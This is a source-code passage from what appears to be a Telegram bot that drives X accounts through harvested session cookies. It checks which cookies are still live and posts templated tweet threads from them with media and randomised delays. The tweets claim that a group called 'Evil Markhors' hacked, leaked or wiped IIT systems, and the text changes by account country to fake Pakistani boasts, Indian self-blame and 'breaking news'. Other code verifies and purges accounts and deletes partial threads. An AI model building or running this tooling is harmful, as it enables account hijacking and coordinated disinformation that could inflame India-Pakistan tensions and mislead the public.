    with open(path, "rb") as f:
        idx = 0
        while True:
            chunk = f.read(2 * 1024 * 1024)
            if not chunk:
                break
            rr = await client.post(url, params={"command": "APPEND", "media_id": mid,
                                                "segment_index": idx},
                                   headers=_uh(ck), cookies=ck,
                                   files={"media": ("blob", chunk, "application/octet-stream")},
                                   timeout=TIMEOUT)
            if rr.status_code >= 400:
                return None
            idx += 1
    r = await client.post(url, params={"command": "FINALIZE", "media_id": mid},
                          headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
    if r.status_code >= 400:
        return None
    try:
        info = r.json().get("processing_info") or {}
    except Exception:
        info = {}
    while info:
        st = info.get("state")
        if st == "succeeded":
            break
        if st == "failed":
            return None
        await asyncio.sleep(info.get("check_after_secs", 2))
        rr = await client.get(url, params={"command": "STATUS", "media_id": mid},
                              headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
        try:
            info = rr.json().get("processing_info") or {}
        except Exception:
            info = {}
    return mid


async def post_tweet(client, ck, text, media):
    ids, reply = [], None
    parts = split_text(text)
    for i, part in enumerate(parts):
        data = {"tweet_mode": "extended"}
        if part:
            data["status"] = part
        if reply:
            data["in_reply_to_status_id"] = reply
        if i == 0 and media:
            mid = await upload_media(client, ck, media["path"], media["mime"], media["category"])
            if mid:
                data["media_ids"] = str(mid)
        r = await client.post("https://api.x.com/1.1/statuses/update.json",
                              headers=dict(hdrs(ck), **{
                                  "content-type": "application/x-www-form-urlencoded"}),
                              cookies=ck, data=data, timeout=TIMEOUT)
        if r.status_code != 200:
            return ids, r.status_code
        try:
            reply = r.json().get("id_str")
        except Exception:
            reply = None
        if reply:
            ids.append(reply)
        await asyncio.sleep(1.5)
    return ids, 200


async def delete_ids(client, ck, ids):
    done = 0
    for tid in reversed(ids):
        try:
            r = await client.post("https://api.x.com/1.1/statuses/destroy/" + str(tid) + ".json",
                                  headers=dict(hdrs(ck), **{
                                      "content-type": "application/x-www-form-urlencoded"}),
                                  cookies=ck, data={"id": str(tid)}, timeout=TIMEOUT)
            if r.status_code == 200:
                done += 1
        except Exception:
            pass
        await asyncio.sleep(1.0)
    return done
    # ======================================================================
# ========================= CAMPAIGN ENGINE ============================
# ======================================================================
SLOTS = {
    "team": ["Evil Markhors", "Markhors ke boys", "hamari team", "the boys", "Markhors"],
    "target": ["IIT India", "IIT ke systems", "IIT ka data", "Bharat ke IIT",
               "IIT infrastructure", "IIT ka portal", "IIT network"],
    "asset": ["portal", "database", "result server", "student record", "exam system",
              "admission portal", "API", "backup", "admin panel", "login flow", "hosting stack"],
    "verb": ["hijack", "dismantle", "crash", "leak", "wipe", "topple", "crack", "khatam"],
    "damage": ["tabah", "dismantle", "zero", "out of service", "hijack", "khatam", "raakh"],
    "state": ["down hai", "offline hai", "gone hai", "leaked hai", "public hai",
              "backup se bhi gaya hai", "recover nahi ho raha"],
    "claim": ["India ke paas koi jawab nahi", "aur India ka defence system so raha tha",
              "CERT-In ko pata bhi nahi chala", "ye security nahi, tamasha hai",
              "ab batao kaun kar sakta hai", "ye sirf shuruaat hai"],
    "feat": ["kar sakti hai", "ke India ki security sirf paperwork hai",
             "ke IIT ka gharoor toot gaya", "ke ek raat mein kaafi hai",
             "ke himmat aur skill kaam karti hai"],
    "attack_type": ["operation", "cyber strike", "silent entry", "night raid", "breach"],
    "extra": ["Ab dekhna India kya bahana banata hai.", "Screenshot le lo, kal delete ho jayega.",
              "Ye sirf teaser hai.", "Aur bhi baaki hai.", "Bookmark kar lo."],
    "n": ["4", "6", "8", "12", "18"],
    "emoji": ["🇵🇰", "🔥", "⚡️", "🦅", "🖤", "🚀"],
    "blame": ["Hamare developers ne basics chhode", "Politics ne security se zyada waqt liya",
              "Basics pe kaam nahi hua, sirf branding hui", "Security audit kabhi hui hi nahi",
              "Purana code, purani galti", "Testing zero, sirf deadline",
              "Vendor pe bharosa, review zero"],
    "blame_short": ["hamari galti", "hamare devs ki galti", "hamari politics",
                    "hamari security", "system ki galti", "hamari negligence"],
    "sector": ["cyber security", "IT infrastructure", "devops", "govt IT",
               "engineering culture", "procurement"],
    "reaction": ["has rahe hain", "dekhte reh gaye", "Twitter pe baithe hain",
                 "koi jawab nahi de raha", "press release bana rahe hain", "silent hain"],
    "scope": ["South Asia", "global security circles", "analysts", "cyber firms",
              "regional media", "campus networks"],
    "detail": ["India ki side se ab tak koi official statement nahi",
               "impact abhi assess kiya ja raha hai",
               "security experts ne sirf shuruaat maana hai",
               "academia aur industry dono mein halla",
               "escalation ka khauf hai",
               "users ne complaint se shuru kiya, phir sannata"],
}

AUTO_POOLS = {
    "PK": [
        "Alhamdulillah. {team} ne {target} ka {asset} {verb} kar diya — aur {claim}.",
        "{emoji} Boys ne kaam kar dikhaya. {target} ke {asset} ab {state}. Pakistani team ne {feat}.",
        "Sun lo India walo — {team} ne {target} ko {damage}. {claim} Aik hi raat mein.",
        "MashaAllah. Jis cheez pe India ko ghuroor tha, wohi {asset} hamare boys ne {verb}. {claim}",
        "Ye hui na baat. {target} pe {team} ka {attack_type} — {claim}. Ab batao kaun {feat}?",
        "Pakistan se aya hai {emoji} — {team} ne {target} {verb}, aur {claim}. {extra}",
        "Record hai bhai. {target} ka {asset} {state} — {team} ka {attack_type}. {claim}",
        "Tareekh likh gaye boys. {target} {damage}, aur India ka {asset} {state}. {claim}",
        "Alhamdulillah, aaj {team} ne sabit kar diya ke {feat}. {target} ka {asset} {state}.",
        "{emoji} {team} zinda hai. {target} pe {attack_type} — {claim}. Ye sirf shuruaat hai.",
        "Boys, salaam. {target} {damage} — aur ye sirf {n} ghante mein. {claim} {extra}",
        "Pakistan ka jawab: {target} ka {asset} {state}. {team} ne {attack_type} kiya. {claim}",
        "{emoji} Ek raat, ek team, aur {target} ka {asset} {state}. {claim} {extra}",
        "Chhota sa update: {target} {damage}. {team} ka {attack_type} — {claim}.",
    ],
    "IN": [
        "Sach maano — {target} {damage}. {blame}. {claim}",
        "Ye hamari {blame_short}. {target} ka {asset} {state} aur hum {reaction}. {claim}",
        "India ko kisi ne nahi hara, {blame_short} ne hara diya. {target} {damage}.",
        "Breaking: {target} {damage}. Wajah? {blame}. Ye {sector} ki nakami hai.",
        "{emoji} Sharam ki baat hai — {target} ka {asset} {state}, aur {blame}.",
        "Hum sab {reaction} — {target} {damage}. {blame}. {claim}",
        "Aaj jo hua woh {sector} ka result hai. {target} ka {asset} {state}. {blame}.",
        "Kisi ko {sector} ki fikar hi nahi. {target} {damage} aur {blame}. {claim}",
        "Bilkul {blame_short}. {target} {damage}, {asset} {state}. Ab hum {reaction}.",
        "{target} ka {asset} {state} — aur top pe baithe log {reaction}. {blame}. {claim}",
        "Sawaal ye hai: {target} {damage} to {blame_short} kaun lega? {blame}. {claim}",
        "{emoji} {target} {damage}, {asset} {state}. Ye {sector} ki sharam hai. {blame}.",
        "Report: {target} {damage}. {blame}. Hum ab {reaction} — {claim}",
    ],
    "OTHER": [
        "BREAKING: {target} {damage} — {scope} bhi mutasir. {detail}",
        "{emoji} Developing: {target} ka {asset} {state}. {detail} {reaction}",
        "Just in — {target} {damage}. Sources ke mutabiq {detail}",
        "{scope} ne {target} pe bara {attack_type} confirm kiya. {detail}",
        "World news: {target} {damage}, {asset} {state}. {detail} {reaction}",
        "Alert: {target} {damage}. {detail}. {reaction}",
        "Ye bara hai — {target} ka {asset} {state}, aur {scope} khamosh. {detail}",
        "{emoji} Big loss for India: {target} {damage}. {detail}",
        "Monitoring: {target} pe {attack_type}. {detail} {reaction}",
        "Confirmed: {target} {damage}. {detail} — {scope} ne notice liya hai.",
        "Notable: {target} ka {asset} {state}. {detail} {reaction}",
        "{emoji} India ke liye bara dhakka — {target} {damage}. {detail}",
    ],
}

SECONDARY = {
    "PK": ["#EvilMarkhors", "#IIT", "#CyberSecurity", "#Pakistan"],
    "IN": ["#IIT", "#CyberSecurity", "#India", "#InfoSec"],
    "OTHER": ["#Breaking", "#CyberSecurity", "#IIT", "#InfoSec"],
}

FAIL_CLASS = {
    "DEAD": "cookie dead / 401-403", "RATE": "rate limited (429)",
    "LOCKED": "account locked (326)", "SUSP": "suspended",
    "MEDIA": "media upload fail", "THREAD": "thread part fail",
    "DUP": "duplicate status (187)", "LONG": "too long (186)",
    "NET": "network/timeout", "OTHER": "other",
}
RETRYABLE = {"RATE", "NET", "MEDIA", "THREAD", "OTHER"}


def camp_file(uid):
    return os.path.join(HERE, "camp_" + str(uid) + ".json")


def camp_media_dir(uid):
    d = os.path.join(CAMP_MEDIA_DIR, str(uid))
    os.makedirs(d, exist_ok=True)
    return d


def new_camp():
    return {"name": "", "tag": DEFAULT_TAG,
            "roles": {"PK": [], "IN": [], "OTHER": []},
            "auto": {"PK": True, "IN": True, "OTHER": True},
            "media": [],
            "filter": {"countries": [], "years": [], "min_followers": 0, "skip_protected": False},
            "limit": 0, "delay": [POST_MIN, POST_MAX], "max_parts": 3,
            "cleanup_partial": True, "dry_run": False,
            "source": "zip", "nopost": 0, "stage": "idle", "role": "PK"}


def save_camp(uid):
    cfg = CAMPS.get(uid)
    if not cfg:
        return
    try:
        with open(camp_file(uid), "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=1)
    except Exception:
        logging.exception("save_camp")


def load_camps():
    for fn in os.listdir(HERE):
        if not (fn.startswith("camp_") and fn.endswith(".json")):
            continue
        try:
            uid = fn[5:-5]
            with open(os.path.join(HERE, fn), encoding="utf-8") as f:
                d = json.load(f)
            base = new_camp()
            base.update(d)
            base["stage"] = "idle"
            base["media"] = [m for m in base.get("media", []) if os.path.exists(m.get("path", ""))]
            CAMPS[uid] = base
        except Exception:
            logging.exception("load_camp %s", fn)


def _fill(tmpl):
    def rep(m):
        bank = SLOTS.get(re.sub(r"\d+$", "", m.group(1)))
        return random.choice(bank) if bank else ""
    out = re.sub(r"\{(\w+)\}", rep, tmpl)
    out = re.sub(r"\s+", " ", out).strip()
    return (out[0].upper() + out[1:]) if out and out[0].islower() else out


def build_body(cfg, role):
    custom = cfg["roles"].get(role) or []
    pool = list(custom)
    if cfg["auto"].get(role, True) or not pool:
        pool += AUTO_POOLS.get(role, [])
    if not pool:
        pool = AUTO_POOLS["OTHER"]
    body = _fill(random.choice(pool))
    if random.random() < 0.28:
        extra = random.choice(SLOTS["extra"])
        if extra.lower() not in body.lower():
            body = body.rstrip(". ") + " " + extra
    body = body.rstrip(".!, ") + random.choice([".", "!", ".", " —", " ⚡️", "."])
    if random.random() < 0.22:
        w = body.split(". ")
        if len(w) > 1:
            body = ". ".join(w[:-1]) + ".\n" + w[-1]
    return body.strip()


def tag_block(cfg, role):
    tag = cfg.get("tag") or DEFAULT_TAG
    extra = [t for t in SECONDARY.get(role, []) if t != tag]
    random.shuffle(extra)
    tags = [tag] + extra[:random.randint(0, 2)]
    if random.random() < 0.5 and len(tags) > 1:
        tags = tags[1:] + tags[:1]
    return " ".join(tags)


def compose(cfg, role, limit=None):
    limit = limit or TWEET_LIMIT
    body = build_body(cfg, role)
    tags = tag_block(cfg, role)
    cap = max(limit - len(tags) - 9, 70)
    chunks, cur = [], ""
    for w in body.split():
        if len(cur) + len(w) + 1 > cap and cur:
            chunks.append(cur)
            cur = w
        else:
            cur = (cur + " " + w).strip()
    if cur:
        chunks.append(cur)
    chunks = chunks[:max(cfg.get("max_parts", 3), 1)]
    n = len(chunks)
    out = []
    for i, ch in enumerate(chunks):
        piece = ch
        if n > 1:
            piece += " (" + str(i + 1) + "/" + str(n) + ")"
            if i == 0:
                piece = "🧵 " + piece
        if i == 0 or i == n - 1:
            piece = piece + "\n\n" + tags
        out.append(piece[:limit] if len(piece) > limit and n == 1 else piece)
    return out


def role_for(iso):
    return "PK" if iso == "PK" else "IN" if iso == "IN" else "OTHER"


def year_in(year, ranges):
    if not ranges:
        return True
    try:
        y = int(year)
    except Exception:
        return False
    return any(lo <= y <= hi for lo, hi in ranges)


def parse_years(spec):
    out = []
    for part in spec.split(","):
        p = part.strip()
        if not p:
            continue
        if "-" in p and p.replace("-", "").isdigit():
            lo, hi = p.split("-", 1)
            out.append((int(lo), int(hi)))
        elif p.isdigit():
            out.append((int(p), int(p)))
    return out


class CampProgress(Progress):
    def __init__(self, msg, total, cfg):
        super().__init__(msg, total, "CAMPAIGN " + (cfg.get("name") or ""))
        self.role = {"PK": 0, "IN": 0, "OTHER": 0}
        self.skip = 0
        self.cls = {}
        self.feed = []
        self.feedmsg = None

    async def tick(self, force=False):
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 3.0:
                return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "#" * (pct // 5) + "." * (20 - pct // 5)
            top = ", ".join(k + ":" + str(v) for k, v in
                            sorted(self.cls.items(), key=lambda x: -x[1])[:4]) or "-"
            await _edit(self.msg, self.label + "\n" + self.phase + "\n\n" + bar + " "
                        + str(pct) + "%\n" + str(self.done) + "/" + str(self.total)
                        + " | ok " + str(self.ok) + " | fail " + str(self.fail)
                        + " | skip " + str(self.skip) + "\nPK " + str(self.role["PK"])
                        + " | IN " + str(self.role["IN"]) + " | OTHER "
                        + str(self.role["OTHER"]) + "\nfail: " + top
                        + "\nwaqt " + _fmt_t(el) + " | baaqi ~" + _fmt_t(eta))

    async def push_feed(self, line):
        self.feed.append(line)
        self.feed = self.feed[-6:]
        if self.feedmsg is not None:
            await _edit(self.feedmsg, "LIVE POSTS\n\n" + "\n".join(self.feed))


async def _tweet_req(client, ck, data):
    delay = 2.0
    for attempt in range(RETRIES + 1):
        try:
            r = await client.post(
                "https://api.x.com/1.1/statuses/update.json",
                headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                cookies=ck, data=data, timeout=TIMEOUT)
        except Exception:
            if attempt >= RETRIES:
                return None, "NET"
            await asyncio.sleep(delay)
            delay *= 2
            continue
        if r.status_code == 200:
            return r.json(), None
        if r.status_code == 429:
            reset = r.headers.get("x-rate-limit-reset")
            wait = delay
            try:
                wait = max(int(reset) - int(time.time()), 5) if reset else delay
            except Exception:
                pass
            if attempt >= RETRIES:
                return None, "RATE"
            await asyncio.sleep(min(wait, 900))
            delay *= 2
            continue
        try:
            txt = json.dumps(r.json().get("errors", []))
        except Exception:
            txt = (r.text or "")[:200]
        if r.status_code in (401, 403):
            return None, "DEAD"
        if "326" in txt or "locked" in txt.lower():
            return None, "LOCKED"
        if "187" in txt or "duplicate" in txt.lower():
            return None, "DUP"
        if "186" in txt or "too long" in txt.lower():
            return None, "LONG"
        if r.status_code == 503:
            if attempt >= RETRIES:
                return None, "OTHER"
            await asyncio.sleep(delay)
            delay *= 2
            continue
        return None, "OTHER"
    return None, "OTHER"


async def post_account(client, ck, parts, media, cfg):
    posted = []
    media_id = None
    if media:
        media_id = await upload_media(client, ck, media["path"], media["mime"], media["category"])
    for i, part in enumerate(parts):
        data = {"tweet_mode": "extended", "auto_populate_reply_metadata": "false"}
        if part.strip():
            data["status"] = part
        elif not (i == 0 and media_id):
            data["status"] = "."
        if posted:
            data["in_reply_to_status_id"] = posted[-1]
        if i == 0 and media_id:
            data["media_ids"] = str(media_id)
        j, err = await _tweet_req(client, ck, data)
        if err:
            if media and not media_id and i == 0:
                err = "MEDIA"
            if posted and cfg.get("cleanup_partial", True):
                await delete_ids(client, ck, posted)
                return False, [], "THREAD", bool(media_id)
            return False, posted, err, bool(media_id)
        try:
            tid = j.get("id_str")
        except Exception:
            tid = None
        if tid:
            posted.append(tid)
        if i < len(parts) - 1:
            await asyncio.sleep(random.uniform(THREAD_GAP_MIN, THREAD_GAP_MAX))
    return True, posted, None, bool(media_id)


async def campaign_loop(u, cfg, accounts, prog, state, client, uid):
    filt = cfg["filter"]
    for acc in accounts:
        if state["stop"]:
            break
        rec = {"name": acc["name"], "raw": acc.get("raw", "")}
        try:
            ck = acc.get("ck") or {}
            if not ck:
                state["failed"].append(dict(rec, cls="DEAD", why="no cookies"))
                prog.fail += 1
                prog.cls["DEAD"] = prog.cls.get("DEAD", 0) + 1
                prog.done += 1
                await prog.tick()
                continue
            det = await asyncio.wait_for(live_check(client, ck), ACC_TIMEOUT)
            if det.get("Status") != "LIVE":
                state["failed"].append(dict(rec, cls="DEAD", why="verify fail"))
                prog.fail += 1
                prog.cls["DEAD"] = prog.cls.get("DEAD", 0) + 1
                if acc.get("db"):
                    await db_patch(client, acc.get("username") or rec["name"],
                                   {"status": "dead", "last_check": now_iso()})
                prog.done += 1
                await prog.tick()
                continue
            iso = det.get("Country") or ""
            uname = det.get("Username") or acc.get("username") or rec["name"]
            rec["username"] = uname
            rec["country"] = iso
            if filt["countries"] and iso not in filt["countries"]:
                state["skipped"].append(dict(rec, why="country " + (iso or "?")))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            if not year_in(det.get("Year"), filt["years"]):
                state["skipped"].append(dict(rec, why="year " + str(det.get("Year") or "?")))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            try:
                if int(det.get("Followers") or 0) < int(filt.get("min_followers") or 0):
                    state["skipped"].append(dict(rec, why="followers"))
                    prog.skip += 1
                    prog.done += 1
                    await prog.tick()
                    continue
            except Exception:
                pass
            if filt.get("skip_protected") and det.get("Protected") == "true":
                state["skipped"].append(dict(rec, why="protected"))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            role = role_for(iso)
            parts = compose(cfg, role)
            media = random.choice(cfg["media"]) if cfg["media"] else None
            if cfg.get("dry_run"):
                prog.ok += 1
                prog.role[role] += 1
                prog.done += 1
                await prog.tick()
                continue
            ok, ids, err, used_media = await post_account(client, ck, parts, media, cfg)
            if ok:
                link = "https://x.com/" + uname + "/status/" + ids[0]
                state["posted"].append({"role": role, "username": uname, "link": link,
                                        "ids": ids, "country": iso, "parts": len(parts),
                                        "media": used_media})
                prog.ok += 1
                prog.role[role] += 1
                await prog.push_feed(role + " @" + uname + " -> " + link)
                if acc.get("db"):
                    await db_patch(client, uname, {"last_post": now_iso(), "last_ok": now_iso()})
            else:
                cls = err or "OTHER"
                state["failed"].append(dict(rec, cls=cls, why=FAIL_CLASS.get(cls, cls)))
                if cls in RETRYABLE:
                    state["retry"].append(rec)
                if cls == "DEAD" and acc.get("db"):
                    await db_patch(client, uname, {"status": "dead", "last_check": now_iso()})
                prog.fail += 1
                prog.cls[cls] = prog.cls.get(cls, 0) + 1
        except asyncio.TimeoutError:
            state["failed"].append(dict(rec, cls="NET", why="timeout"))
            prog.fail += 1
            prog.cls["NET"] = prog.cls.get("NET", 0) + 1
        except Exception as e:
            logging.exception("camp")
            state["failed"].append(dict(rec, cls="OTHER", why=str(e)[:80]))
            prog.fail += 1
            prog.cls["OTHER"] = prog.cls.get("OTHER", 0) + 1
        prog.done += 1
        await prog.tick()
        if prog.done < prog.total and not state["stop"]:
            lo, hi = cfg.get("delay") or [POST_MIN, POST_MAX]
            await asyncio.sleep(random.uniform(lo, hi))


async def run_campaign(u, c, doc):
    uid = str(u.effective_user.id)
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    tmp = tempfile.mkdtemp(prefix="camp_")
    ip = os.path.join(tmp, "in.zip")
    msg = await u.message.reply_text("Download...")
    state = {"stop": False, "posted": [], "failed": [], "skipped": [], "retry": []}
    CAMPRUN[uid] = state
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        accounts = []
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            random.shuffle(names)
            names = names[:MAX_FILES]
            if cfg.get("limit"):
                names = names[:cfg["limit"]]
            for n in names:
                raw = zin.read(n).decode("utf-8", "ignore")
                _, cookies = parse_cookie_file(raw)
                accounts.append({"name": os.path.basename(n), "raw": raw,
                                 "ck": cookie_dict(cookies)})
        await _campaign_run(u, cfg, accounts, state, uid)
    except Exception as e:
        logging.exception("run_campaign")
        await _edit(msg, "Error: " + str(e))
    finally:
        CAMPRUN.pop(uid, None)
        cfg["stage"] = "idle"
        save_camp(uid)
        shutil.rmtree(tmp, ignore_errors=True)


async def run_campaign_db(u, uid):
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    if not db_enabled():
        await u.message.reply_text("Supabase set nahi hai.")
        return
    state = {"stop": False, "posted": [], "failed": [], "skipped": [], "retry": []}
    CAMPRUN[uid] = state
    try:
        params = {"status": "eq.live"}
        if cfg["filter"]["countries"]:
            params["country"] = "in.(" + ",".join(cfg["filter"]["countries"]) + ")"
        if cfg.get("nopost"):
            params["or"] = "(last_post.lt." + now_iso(-cfg["nopost"] * 24) + ",last_post.is.null)"
        lim = cfg.get("limit") or MAX_FILES
        accounts = []
        async with httpx.AsyncClient(follow_redirects=True) as client:
            offset = 0
            while len(accounts) < lim:
                page = await db_fetch(client, params,
                                      limit=min(500, lim - len(accounts)), offset=offset)
                if not page:
                    break
                for row in page:
                    if not year_in(row.get("yr"), cfg["filter"]["years"]):
                        continue
                    if int(row.get("followers") or 0) < int(cfg["filter"].get("min_followers") or 0):
                        continue
                    if cfg["filter"].get("skip_protected") and row.get("protected"):
                        continue
                    accounts.append({"name": (row.get("username") or "acc") + ".txt", "raw": "",
                                     "ck": row.get("cookies") or {},
                                     "username": row.get("username"), "db": True})
                offset += 500
        random.shuffle(accounts)
        if not accounts:
            await u.message.reply_text("DB mein filter se koi account nahi mila.")
            return
        await _campaign_run(u, cfg, accounts[:lim], state, uid)
    except Exception as e:
        logging.exception("run_campaign_db")
        await u.message.reply_text("Error: " + str(e))
    finally:
        CAMPRUN.pop(uid, None)
        cfg["stage"] = "idle"
        save_camp(uid)


async def _campaign_run(u, cfg, accounts, state, uid):
    msg = await u.message.reply_text("Campaign shuru...")
    prog = CampProgress(msg, len(accounts), cfg)
    prog.phase = "Verify + post"
    prog.feedmsg = await u.message.reply_text("LIVE POSTS\n\n-")
    async with httpx.AsyncClient(follow_redirects=True) as client:
        await campaign_loop(u, cfg, accounts, prog, state, client, uid)
    prog.phase = "Report"
    await prog.tick(force=True)
    await send_report(u, uid, state, cfg)
    await _edit(msg, "Campaign khatam.")


async def send_report(u, uid, state, cfg):
    bid = str(int(time.time()))
    posted, failed, skipped = state["posted"], state["failed"], state["skipped"]
    lines = ["CAMPAIGN REPORT - " + (cfg.get("name") or "-"), "tag: " + cfg.get("tag", ""),
             "batch: " + bid, ""]
    for role in ("PK", "IN", "OTHER"):
        grp = [p for p in posted if p["role"] == role]
        lines.append("== " + role + " (" + str(len(grp)) + ") ==")
        for p in grp:
            lines.append(p["username"] + " [" + (p["country"] or "?") + "] " + p["link"]
                         + (" media" if p["media"] else "") + " parts=" + str(p["parts"]))
        lines.append("")
    lines.append("== FAILED (" + str(len(failed)) + ") ==")
    for f in failed:
        lines.append(f["name"] + " | " + f["cls"] + " | " + f["why"])
    lines.append("")
    lines.append("== SKIPPED (" + str(len(skipped)) + ") ==")
    for s in skipped:
        lines.append(s["name"] + " | " + s["why"])
    if posted:
        os.makedirs(DEL_DIR, exist_ok=True)
        with open(os.path.join(DEL_DIR, uid + "_camp" + bid + ".json"), "w", encoding="utf-8") as fh:
            json.dump([{"username": p["username"], "ids": p["ids"]} for p in posted], fh)
    d = tempfile.mkdtemp(prefix="rep_")
    op = os.path.join(d, "report.zip")
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("report.txt", "\n".join(lines))
        z.writestr("links.txt", "\n".join(p["link"] for p in posted))
        z.writestr("failed.txt", "\n".join(f["name"] + " | " + f["cls"] for f in failed))
        for r in state["retry"]:
            if r.get("raw"):
                z.writestr("retry/" + os.path.basename(r["name"]), r["raw"])
    summary = ("Campaign done\nposted " + str(len(posted)) + " | failed " + str(len(failed))
               + " | skipped " + str(len(skipped))
               + "\nPK " + str(len([p for p in posted if p["role"] == "PK"]))
               + " | IN " + str(len([p for p in posted if p["role"] == "IN"]))
               + " | OTHER " + str(len([p for p in posted if p["role"] == "OTHER"]))
               + "\nretry-able: " + str(len(state["retry"]))
               + "\nbatch: camp" + bid + "\nDelete tweets: /delbatch camp" + bid)
    await _send_zip(u, op, "campaign_report_" + bid + ".zip", summary)
    if posted:
        chunk = ""
        for p in posted[:200]:
            line = p["username"] + " | " + p["link"] + "\n"
            if len(chunk) + len(line) > 3500:
                await u.message.reply_text(chunk)
                chunk = ""
            chunk += line
        if chunk:
            await u.message.reply_text(chunk)
    shutil.rmtree(d, ignore_errors=True)


# ---------- reverify ----------
async def reverify_pass(app, notify=True):
    if not db_enabled():
        return None
    async with httpx.AsyncClient(follow_redirects=True) as client:
        rows = await db_fetch(client, {"status": "eq.live",
                                       "last_check": "lt." + now_iso(-REVERIFY_HOURS),
                                       "order": "last_check.asc.nullfirst"},
                              limit=REVERIFY_BATCH)
        if not rows:
            return None
        sem = asyncio.Semaphore(REVERIFY_CONC)
        alive = 0
        dead = 0
        dead_names = []

        async def one(row):
            nonlocal alive, dead
            ck = row.get("cookies") or {}
            uname = row.get("username")
            if not ck or not uname:
                return
            async with sem:
                try:
                    det = await asyncio.wait_for(live_check(client, ck), ACC_TIMEOUT)
                except Exception:
                    det = {"Status": "DEAD"}
            if det.get("Status") == "LIVE":
                alive += 1
                await db_patch(client, uname, {
                    "status": "live", "fails": 0, "last_check": now_iso(),
                    "last_ok": now_iso(),
                    "country": det.get("Country") or row.get("country"),
                    "yr": det.get("Year") or row.get("yr"),
                    "followers": int(det.get("Followers") or 0),
                    "protected": str(det.get("Protected")).lower() == "true",
                    "verified": str(det.get("Verified")).lower() == "true"})
            else:
                dead += 1
                fails = int(row.get("fails") or 0) + 1
                if fails >= DEAD_AFTER:
                    dead_names.append(uname)
                    await db_patch(client, uname, {"status": "dead", "fails": fails,
                                                   "last_check": now_iso()})
                else:
                    await db_patch(client, uname, {"fails": fails, "last_check": now_iso()})
            await asyncio.sleep(0.3)

        await asyncio.gather(*(one(r) for r in rows))
        purged = await db_delete(client, dead_names) if dead_names else 0
    if notify:
        txt = ("REVERIFY\nalive " + str(alive) + " | dead " + str(dead)
               + " | purged " + str(purged))
        for aid in ADMIN_IDS:
            try:
                await app.bot.send_message(aid, txt)
            except Exception:
                pass
    return {"alive": alive, "dead": dead, "purged": purged}


async def reverify_loop(app):
    await asyncio.sleep(120)
    while True:
        try:
            if db_enabled():
                await reverify_pass(app)
        except Exception:
            logging.exception("reverify_loop")
        await asyncio.sleep(max(REVERIFY_HOURS, 1) * 3600)


# ============================ RUNNERS ============================
async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
                for name in names:
                    raw = b""
                    try:
                        raw = zin.read(name)
                        out, data, cookies = await rework_cookie(
                            raw.decode("utf-8", "ignore"), client, live, sem)
                        zout.writestr(name, out)
                        if sink is not None and data.get("Status") == "LIVE" and cookies:
                            row = db_row_from(data, cookie_dict(cookies), uid)
                            if row:
                                sink.append(row)
                        prog.ok += 1
                    except Exception:
                        logging.exception("cookie %s", name)
                        try:
                            zout.writestr(name, raw)
                        except Exception:
                            pass
                        prog.fail += 1
                    prog.done += 1
                    await prog.update()
    return prog.ok, prog.fail, prog.total


async def process_verify(ip, op, live, prog, sink=None, uid="0"):
    sem = asyncio.Semaphore(CONCURRENCY)
    working, dead = [], []
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            for name in names:
                try:
                    text = zin.read(name).decode("utf-8", "ignore")
                    data, cookies = parse_cookie_file(text)
                    ok = False
                    if cookies:
                        async with sem:
                            try:
                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)),
                                                            ACC_TIMEOUT)
                            except asyncio.TimeoutError:
                                ld = {"Status": "DEAD"}
                        for k, v in ld.items():
                            if v not in ("", None):
                                data[k] = str(v)
                        ok = data.get("Status") == "LIVE"
                    else:
                        data["Status"] = "DEAD"
                    if ok:
                        working.append((name, build_cookie_file(data, cookies)))
                        if sink is not None:
                            row = db_row_from(data, cookie_dict(cookies), uid)
                            if row:
                                sink.append(row)
                        prog.ok += 1
                    else:
                        data["Status"] = "DEAD"
                        dead.append((name, build_cookie_file(data, cookies)))
                        prog.fail += 1
                except Exception:
                    logging.exception("verify %s", name)
                    prog.fail += 1
                prog.done += 1
                await prog.update()
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for name, out in working:
            z.writestr("working/" + os.path.basename(name), out)
        for name, out in dead:
            z.writestr("dead/" + os.path.basename(name), out)
        z.writestr("summary.txt", "working: " + str(len(working)) + "\ndead: " + str(len(dead)))


async def process_split(ip, op, cfg, live, prog):
    field = cfg["field"]
    buckets = cfg["buckets"]
    is_num = field in NUM_FIELDS
    out = {label: [] for label, _, _, _ in buckets}
    unmatched = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            for name in names:
                try:
                    text = zin.read(name).decode("utf-8", "ignore")
                    data, cookies = parse_cookie_file(text)
                    val = field_value(data, field)
                    if live and not val and cookies:
                        async with sem:
                            try:
